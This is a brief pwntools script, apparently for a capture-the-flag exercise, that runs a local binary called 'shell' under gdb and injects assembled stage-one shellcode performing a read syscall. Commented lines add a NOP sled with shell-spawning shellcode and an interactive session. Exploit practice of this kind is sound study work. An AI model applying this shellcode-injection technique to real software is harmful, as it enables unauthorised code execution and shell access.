#!/bin/python3
from pwn import *

elf = context.binary = ELF('shell')
context.terminal = ["tmux", "splitw", "-h"]
p = process(elf.path)
gdb.attach(p)
sc = asm("""
    mov rdx, 0x40
    lea rsi, [rbp]
    xor rdi, rdi
    syscall
""")

print(sc)
p.sendline(sc)
#p.sendline(b'\x90' *offset +  asm(shellcraft.sh()))
#p.interactive() 
